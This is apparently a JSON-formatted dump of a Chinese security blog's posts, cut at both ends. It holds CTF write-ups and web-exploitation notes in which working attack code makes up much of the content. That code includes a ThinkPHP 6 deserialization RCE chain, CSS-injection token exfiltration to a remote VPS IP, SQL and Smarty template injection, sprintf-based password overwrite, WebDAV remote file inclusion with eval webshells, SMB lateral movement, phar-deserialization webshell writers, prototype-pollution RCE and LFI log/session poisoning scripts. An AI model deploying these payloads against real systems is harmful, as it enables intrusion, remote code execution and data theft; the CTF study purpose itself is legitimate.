1age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; md5解密登录即可 参考链接: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"。即是终点也是起点","categories":[],"tags":[]},{"title":"css注入学习","slug":"css注入学习","date":"2019-12-02T01:19:49.000Z","updated":"2020-03-29T15:06:13.113Z","comments":true,"path":"2019/12/02/css注入学习/","link":"","permalink":"https://glotozz.github.io/2019/12/02/css%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、假设一个php页面 二、窃取input标签中的token 三、窃取&lt;script&gt;标签中的token 参考链接 css本身是一种容错率很强的语言，css文件即使遇到错误，也会一直读取，直到有符合结构的语句。我们可以利用css解析的容错性构造 %0a){}body{color:red}/* 来执行任意css。 一、假设一个php页面1234567891011121314&lt;?php$token1 &#x3D; md5($_SERVER[&#39;HTTP_USER_AGENT&#39;]);$token2 &#x3D; md5($token1);?&gt;&lt;!doctype html&gt;&lt;meta charset&#x3D;utf-8&gt;&lt;input type&#x3D;hidden value&#x3D;&lt;?&#x3D;$token1 ?&gt;&gt;&lt;script&gt; var TOKEN &#x3D; &quot;&lt;?&#x3D;$token2 ?&gt;&quot;;&lt;&#x2F;script&gt;&lt;style&gt; &lt;?&#x3D;preg_replace(&#39;#&lt;&#x2F;style#i&#39;, &#39;#&#39;, $_GET[&#39;css&#39;]) ?&gt;&lt;&#x2F;style&gt; 二、窃取input标签中的token12345&#x2F;*选择value值为abc的input标签*&#x2F;input[value&#x3D;&quot;abc&quot;] &#123; &#125;&#x2F;*选择value值以a开头的input标签 *&#x2F;input[value^&#x3D;&quot;a&quot;] &#123; &#125; 那么我们就可以通过上面的来爆破第一个字符 比如 123input[value^&#x3D;&quot;0&quot;] &#123; background: url(http:&#x2F;&#x2F;serwer-napastnika&#x2F;0);&#125; 有个坑，最新版firefox如果type=hiddden会无法加载，上面的图是删去type=hidden的时候 chrome可以 一开始想着构造payload然后用脚本发包，发现脚本发的会收不到，原因可能是因为这是浏览器去请求的。。。同样直接把payload放firefox也不行，那么就生成payload放入chorme即可，再根据vps的日志生成下一个payload 123456res &#x3D; &quot;&quot;for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&#39;: a &#x3D; &#39;input[value^&#x3D;&quot;28&#39;+str(i)+&#39;&quot;] &#123;background:url(\\&#39;http:&#x2F;&#x2F;59.110.164.44&#x2F;28&#39;+str(i)+&#39;\\&#39;);&#125;&#39; print a res +&#x3D; a+&quot;\\n&quot;print res 题目环境关了，开一个docker docker地址：https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame 这里是外链css，那么把css文件放到vps上，每次修改即可 三、窃取&lt;script&gt;标签中的token 构造一个字体，把所有字符的宽度都设置为0。 把「xctf」的宽度设置为10000。 当页面里出现「xctf」的时候，就会出现滚动条。 在滚动条的样式里，通过background: url()发送请求。 逐位爆破。 我们将使用连字和样式滚动条定义我们自己的字体来完成攻击。什么是连字：http://www.mzh.ren/ligature-intro.html 借助fontforge等其他软件 ，我们可以创建自己的字体包括自己的连字。Fontforge是一个相当强大的字体创建工具。我们将使用它将字体从SVG格式转换为WOFF。 思路还是容易理解的，复现有点麻烦，具体参考链接🤦‍♂️ 参考链接 https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/ https://xz.aliyun.com/t/6655#toc-5","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"tp6.0.0反序列化漏洞分析","slug":"tp6-0-0反序列化漏洞分析","date":"2019-12-01T05:54:22.000Z","updated":"2020-03-29T15:06:57.427Z","comments":true,"path":"2019/12/01/tp6-0-0反序列化漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 参考链接 这次安洵杯考到了这个，当时没时间分析，跟着力哥的blog分析一下，顺便搞清楚力哥的exp为啥是错的😁 toString()魔术方法触发方法，摘自p神知识星球 一、获取漏洞tp6.0 修改app/controller/Index.php 1234567891011&lt;?phpnamespace app\\controller;class Index&#123; public function index($input&#x3D;&#39;&#39;) &#123; echo $input; unserialize($input); &#125;&#125; 二、漏洞实现 三、漏洞分析tp5.1和tp5.2的漏洞入口都是Windows类的__destruct() tp6全局搜索__destruct()， vendor/topthink/think-orm/src/Model.php $this-&gt;lazySave可控，追踪save() 其中updateData()可以进一步利用 跟进checkAllowFields() 此处存在字符串拼接，追踪db()也存在字符串拼接 这里和力哥的代码不太一样，但是不影响 之前提到字符串拼接会触发__toString() 尝试构造，这里直接静态调用db()属性，追踪connect() 似乎都没啥限制。。 整理一下POP链 Model类-&gt;__destruct()-&gt;save()-&gt;updateData()-&gt;checkAllowField()-&gt;toString() 之后就是之前tp5.2的链 Conversion是trait类型的，不能实例化，通过use来使用，搜索定位到Model类， 这里挺巧的，最后都是Model类 直接写exp，在之前tp5.2的基础上修改 poc 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace think &#123; abstract class Model&#123; private $data; private $withAttr &#x3D; []; private $lazySave &#x3D; true; protected $table; function __construct($closure,$b&#x3D;&#39;&#39;) &#123; &#x2F;&#x2F; var_dump($closure); $this-&gt;data &#x3D; $closure; $this-&gt;withAttr &#x3D; [&quot;glotozz&quot;&#x3D;&gt;&#39;system&#39;]; &#x2F;&#x2F; var_dump($b); $this-&gt;name &#x3D; $b; &#125; &#125;&#125;namespace think\\model &#123; class Pivot extends \\think\\Model&#123; function __construct($closure,$b&#x3D;&#39;&#39;) &#123; &#x2F;&#x2F;注意这里不是$b&#x3D;&#39;&#39; parent::__construct($closure,$b); &#125; &#125;&#125;namespace&#123; $pivot &#x3D; new think\\model\\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;]); $model &#x3D; new think\\model\\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;],$pivot); echo urlencode(serialize($model)); &#x2F;&#x2F; var_dump($model);&#125; 用xdebug慢慢调，哪里不对改哪里。。通常是未对属性进行修饰🧐 那么用exp打一下题目试试，没啥结果。。。 我本地搭建了一下并调试 发现原来是出题人偷偷把这里改了。。。那么我只需要把name变量改成table即可 简单调试下力哥的exp，目前已知的是源码有点不同， 是这里直接exit()了。。。 参考链接 https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"D3CTF-wp","slug":"D3CTF-wp","date":"2019-11-26T00:01:11.000Z","updated":"2020-04-10T13:30:18.501Z","comments":true,"path":"2019/11/26/D3CTF-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/26/D3CTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 easyweb Showhub fakeonlinephp ezupload ezts 参考链接: 趁着D^3CTF环境还没关，赶紧复现一下 easyweb这题给出了源码，代码审计 漏洞触发点在controllers/user.php 跟踪get_view() 跟踪sql_safe()和safe_render() 非常明显的利用点，那么我们只需要在$username注入的时候加上{绕过过滤即可 简单测试一个 1aa&#39;un&#123;ion se&#123;lect 666 limit 1,1# 得到666 然后数据库中并没有flag， 因为是smarty渲染模版，尝试模版注入 123&#123;&#123;$smarty.version&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D limit 1,1# 但是得使用函数。。。 1234&#123;php&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#x2F;php&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7b7068707d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b2f7068707d limit 1,1# 发现不行，需要用两个大括号包裹，可能是被渲染一次后会少一个，具体等下次本地搭建一下smarty模板注入 123&#123;&#123;php&#125;&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#123;&#x2F;php&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7b7b7068707d7d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b7b2f7068707d7d limit 1,1# 有时间自己搭一下smarty环境复现 Showhub给了源码。。。很多时候看到源码就会紧张，但其实这里文件也不多 问题出现在Models/Model.php sprintf()格式化字符串漏洞之前也遇到过 参考链接： https://blog.csdn.net/weixin_41185953/article/details/80485075 sprintf(format,arg1,arg2,arg++) arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。 注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$“ 组成。 举个栗子 然后是看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344switch (format[inpos]) &#123;case &#39;s&#39;: &#123; zend_string * t; zend_string * str &#x3D; zval_get_tmp_string(tmp, &amp;t); php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0); zend_tmp_string_release(t); break; &#125;case &#39;d&#39;: php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign); break;case &#39;u&#39;: php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment); break;case &#39;g&#39;:case &#39;G&#39;:case &#39;e&#39;:case &#39;E&#39;:case &#39;f&#39;:case &#39;F&#39;: php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign); break;case &#39;c&#39;: php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp)); break;case &#39;o&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec); break;case &#39;x&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec); break;case &#39;X&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec); break;case &#39;b&#39;: php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec); break;case &#39;%&#39;: php_sprintf_appendchar( &amp; result, &amp;outpos, &#39;%&#39;); break;default: break;&#125; 可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题： 没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\\当作一个格式化字符的类型而吃掉, 最后%\\（或%1$\\）被替换为空 那么回到题目上来，因为我们要逃逸单引号，那么势必%符号多余arg参数，考虑使用%1$\\，从而逃逸这里addslashes()添加的\\ 构造 那么这里admin密码是sha256加密的，即使爆破出来了也无济于事，提示修改密码 利⽤ON DUPLICATE KEY UPDATE ,当insert已经存在的记录时，执⾏Update用下面的当用户名, 密码随便, 注册 123admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#&#x3D;&gt;INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;) 本地简单测试一下，很成功 这里注册完直接就登录进去了。。。应该是根据注册时的用户名把 不知道为啥退出再登录会失败。。。 下一步是利用HTTP请求走私攻击 参考链接： https://mengsec.com/2019/10/10/http-request-smugging/ CL-TE 可能由于我上一步不是直接登录的，导致也没成功 =========================== 失败的原因可能是发的次数不够多，下次用bp的intruder发包 这题的检测应该是在中间代理ATS服务器，通过检测才将请求转发给后端服务器。所以我们登陆admin后，直接访问/WebConsole是无法通过中间代理的检测的。但是因为检测是中间代理，后端服务器是无条件相信中间代理转发的包的，所以我们可以通过走私的方式将想要的数据包通过代理转发给后端服务器。 fakeonlinephp 开始以为是原题，发现环境经常会404。。。应该就是为了防止用原解 参考翔哥的做法： https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp 这里是windows系统， 正常情况下无法远程包含，但是因为是windows，可以绕过allow_url_include的限制RFI，参考： https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/ 首先启用WebDAV 1docker run -v ~&#x2F;webdav:&#x2F;var&#x2F;lib&#x2F;dav -e ANONYMOUS_METHODS&#x3D;GET,OPTIONS,PROPFIND -e LOCATION&#x3D;&#x2F;webdav -p 80:80 --rm --name webdav bytemark&#x2F;webdav 启用后在~/webdav/data下放置php文件 包含 1?orange&#x3D;&#x2F;&#x2F;59.110.164.44&#x2F;&#x2F;webdav&#x2F;test.php 尝试写入 1234@&lt;?php phpinfo(); @eval($_POST[&#39;cmd&#39;]);?&gt; 发现没反应。。变形试试 1234@&lt;?php phpinfo(); @eval(($_POST)&#123;cmd&#125;);?&gt; 成功，用蚁剑连 但是里面的文件内容是乱码。。。 修改下编码器成功 这里再回去看看phpinfo()，正好前天学习看文章嫖了个工具😁 https://github.com/proudwind/phpinfo_scanner 利用蚁剑的插件扫描内网端口 .git泄露 1python git_extract.py http:&#x2F;&#x2F;3f2b604603.fakeonelinephp.d3ctf.io&#x2F;.git&#x2F; hint2.txt 1210.24 🌧️这台💻跑着web服务，为了防止大黑阔用nginx 0day黑我电脑拿flag，👴把flag放到了内网的💻上(172.19.97.8 C:\\Users\\Administrator\\Desktop\\flag.txt 还给了个字典 显然需要我们爆破密码进入内网 而之前就通过扫描发现这台内网主机172.19.97.8是开放445端口SMB服务的，而且给了字典，所以我们直接上传hydra工具后进行爆破密码即可： 上传hydra，一开始不行，换了个目录成功了 但是虚拟终端仍然执行不了命令。。。。翔哥说用linux的可以👍 那么kali中安装antsowrd，一开始参考网上的花了一些时间利用nodejs发现还是不行，还是参考官方github的靠谱 https://doc.u0u.us/zh-hans/getting_started/get_antsword.html 先下载加载器，再加载源码即可 前人栽树，发现12文件夹已经上传好了hydra，当时自己上传也行，就是有点不稳定 1net use \\\\172.19.97.8\\ipc$ eDHU27TlY6ugslV &#x2F;user:administrator 1dir \\\\172.19.97.8\\c$ 1type \\\\172.19.97.8\\c$\\Users\\Administrator\\Desktop\\flag.txt 这方面真的是盲区。。。复现成功还是挺有感觉的 ezupload 先看看过滤方法 ph后缀被ban了，想到.htaccess 但是对内容存在限制，下面两种无法使用 12AddType application&#x2F;x-httpd-php .jpgphp_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot; 这里可以使用 1AddHandler php7-script .txt file://和php://被ban了，利用data://或者http://协议 先尝试写入.htaccess 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess 调试是成功的，但是windows由于无法写入.开头的文件，切换到linux下 中间出现了点小报错查看error_log即可 再开启下扩展 12LoadModule rewrite_module modules&#x2F;mod_rewrite.soAllowOverride All 突然发现事情并不简单😱。。。为啥之前__destruct()写入的文件不存在。。error_log看一下提示没有权限。。。但是同样的权限.htaccess成功创建 这其实算是一个提示把，本地测一下__destruct()的当前路径 发现在根目录，那么这里要写入的话可以通过触发反序列化来写入，正好之前的phar://没有被ban 并且phar是可以gzip压缩的，从而绕过对某些字符的检查 那么还需要解决__destruct()中写入文件的绝对路径的问题，列目录 利用__toString() 举个例子 那么我们先获取绝对路径 1234567891011121314151617181920212223&lt;?php class dir&#123; public $userdir; public $filename; public $url; public function __construct($url,$filename) &#123; $this-&gt;url &#x3D; $url; $this-&gt;filename &#x3D; $filename; &#125; &#125; $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;); $a -&gt; userdir &#x3D; &#39;..&#x2F;&#39;; $b &#x3D; new dir(&#39;b&#39;,&#39;b&#39;); $b -&gt; userdir &#x3D; $a; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub $phar-&gt;setMetadata($b); &#x2F;&#x2F;将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt; 其中filename为我们上传的文件的相对路径，先放到vps上，压缩成gz，重命名为1 phar反序列化 那么我们的绝对路径就知道了，/var/www/html/50f3c73883917b44/e9afd20997dff75e292259158f0006fb，我本来还想再看上一级目录，提示hacker!!，应该是压缩后仍然被检测到了某些字符。。直接一下步 利用反序列化写.txt文件 12345678910111213141516171819202122&lt;?php class dir&#123; public $userdir; public $url; public $filename; public function __construct($url,$filename) &#123; $this-&gt;url &#x3D; $url; $this-&gt;filename &#x3D; $filename; &#125; &#125; $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;); $a -&gt; filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;6d4bcfa605eacb74&#x2F;upload&#x2F;e9afd20997dff75e292259158f0006fb&#x2F;glotozz&#39;; $a -&gt; userdir &#x3D; &#39;&lt;?php phpinfo();eval($_POST[cmd]);?&gt;&#39;; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub $phar-&gt;setMetadata($a); &#x2F;&#x2F;将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt; 又是老套路。。。 1chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;)); webroot in /var/www/html+webroot changes一般就是再加一个沙箱 .htaccess的其他写法AddHandler php7-script .txt __destruct()的路径为根目录 phar压缩(⽤gzip)绕过字符检测 glob://也可以用来绕过open_basedir。。。。 ezts======未完待续 卧槽，，环境关了。。那么记录下思路 KOA框架https://github.com/koajs/koahttps://github.com/d-band/koa-orm 我感觉之后wp这个应该是fuzz出来的 123http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20((%271&amp;value&#x3D;1http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%201%23&amp;value&#x3D;1http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20(ascii(substr((select%20version()),1,1))%3E10)%23&amp;value&#x3D;1 盲注脚本出admin账号密码 原型链污染 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execS... /flag 是root 400权限, 现在是node⽤⼾, 还需要提权一下 CVE-2019-14287 参考链接: https://wx.zsxq.com/dweb2/index/group/824215518412 https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"LFIToRCE思路","slug":"LFIToRCE思路","date":"2019-11-24T13:03:15.000Z","updated":"2020-03-28T02:07:59.296Z","comments":true,"path":"2019/11/24/LFIToRCE思路/","link":"","permalink":"https://glotozz.github.io/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 先说说代码审计中，存在文件上传表单或者函数能写文件 PHP中的一些协议 使用 PHP 封装器的 expect://command 使用 PHP 封装器的php://file 使用 PHP 封装器的php://filter 使用 PHP 的input://stream 使用 data://text/plain;base64,command windows可绕过 allow_url_include 的限制 RFI 日志文件、环境文件等可控文件 apache log getshell /proc/self/environ /var/log/mail 利用PHP会话值执行RCE使用控制 session+LFI getshell phpinfo-LFI 包含临时文件getshell LFI + php7崩溃 参考链接 先说说代码审计中，存在文件上传表单或者函数能写文件 写入路径在web目录外，外部用户无法直接访问时 后缀名无法被解析，比如jpg等 配合LFI即可RCE 一个例子： https://xz.aliyun.com/t/6229 这个的LFI点是参数用于加载目标站点上的JS文件 然后是CTF中的一些思路，当然也包括第一个 PHP中的一些协议使用 PHP 封装器的 expect://commandemmm，但是这个一般不开启，xxe也可以和这个扩展结合 使用 PHP 封装器的php://file很常见，访问本地文件系统 file:///path/to/file.ext 在文件包含中其实也就是等价/path/to/file.ext 但是如果来个题目给你来个正则匹配../ 或/开头的时候就可以用这个方法来绕过了。 使用 PHP 封装器的php://filter使用 PHP 的input://stream allow_url_include 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。 使用 data://text/plain;base64,command=============================新增一个 windows可绕过 allow_url_include 的限制 RFI 参考链接： https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/ ========================================================================== 日志文件、环境文件等可控文件 文件读取漏洞路径收集： https://blog.csdn.net/qq_33020901/article/details/78810035 一般在Linux系统下通过apt-get install apache2 默认安装的apache 或者nginx都没有权限访问这些文件 ，但是有时候有些管理员会因为方便等问题导致权限配置错误。 🧐 apache log getshell通过发包或者nc 这里为什么要用nc去访问，不用http://xxxxxx/&lt;?php &gt;这样的方式去访问，因为日志在存储的过程中会把符号转换成编码的形式，然后就无法产生一句话了。 web日志常见的路径 1234567&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;acces_log&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log 为了方便，先把之前的access.log删除，在重启下apache 以我ubuntu 18.04为例，尝试 1&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; 查看日志 尝试lfi.php中包含，发现失败， 果然没有读取权限。。。。 我把这个文件内容放到能被包含到的地方，能成功getshell 或者修改权限😋 所以以后尝试之前先包含一下这个文件，如果能包含，能够看到文件内容，这意味着你对这个文件具有读写权限 ，那么已经成功了大半 /proc/self/environ 参考链接：https://yq.aliyun.com/articles/441861 我的ubuntu 18.04的默认权限😅 那么也暂时不复现了。。偷懒 /var/log/mail 参考链接：https://xz.aliyun.com/t/3799#toc-15 1netstat -tlpn 发现自己未开启smtp服务，那么也不复现了 思路不难，和之前的类似，SMTP日志投毒，之前做过一题ssrf+gopher 类似的还有下面的 123&#x2F;proc&#x2F;self&#x2F;fd&#x2F;var&#x2F;log&#x2F;vsftpd.log&#x2F;var&#x2F;log&#x2F;sshd.log 下面的都可以通过phpinfo()来获取路径，或者靠爆破 利用PHP会话值执行RCE使用控制 参考链接： https://www.4hou.com/vulnerable/7774.html 其实说起来之前做题利用过session，当时是利用序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞，这里我们只需要写入shell即可 存在一个LFI时，并且开启了session php保存格式sess_SESSIONID 当然phpinfo()也可以看 默认位置是 /tmp/(PHP Sessions) /var/lib/php/session/(PHP Sessions) /var/lib/php5/(PHP Sessions) 因为可能通常这两点不在同一个文件，特意分两个文件 1.php 123&lt;?php include($_POST[&#39;file&#39;]);?&gt; 2.php 1234&lt;?php session_start(); echo $_COOKIE[&#39;user&#39;]; $_SESSION[&#39;name&#39;] &#x3D; $_COOKIE[&#39;user&#39;]; 那么我们只需要构造 1Cookie:user&#x3D;%3C%3Fphp+system%28%22dir%22%29%3B%3F%3E 注意这里要url编码，之后会自动url解码一次，否则分号作为传递参数的分隔符 session还有另一个更加通用的思路 session+LFI getshellsession.upload_progress 官方文档：https://www.php.net/manual/zh/session.upload-progress.php 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得 攻击流程 1、构造上传表单，参考链接 123456&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt; 默认配置如下， session.upload_progress.cleanup开启，读取完post内容时,session内容就会清空,所以我们需要用到条件竞争,一直发送请求,然后一直包含。 2、bp或者脚本进行条件竞争 上传包 请求包 请求包含我设置5000次,上传我设置1000次(这样可以一边持续请求,然后一边生成) 用@wonderkun师傅的一个脚本 123456789101112131415161718192021222324252627282930313233343536#!coding:utf-8import requestsimport timeimport threadinghost &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;PHPSESSID &#x3D; &#39;ssssssss&#39;def creatSession(): while True: files &#x3D; &#123; &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;a.txt&quot;, &quot;rb&quot;)) &#125; data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : &quot;&lt;?php echo md5(&#39;1&#39;);?&gt;&quot; &#125; headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125; r &#x3D; requests.post(host+&#39;1.php&#39;,files &#x3D; files,headers &#x3D; headers,data&#x3D;data) # print r.content.decode(&#39;utf-8&#39;)fileName &#x3D; r&quot;E:\\Program 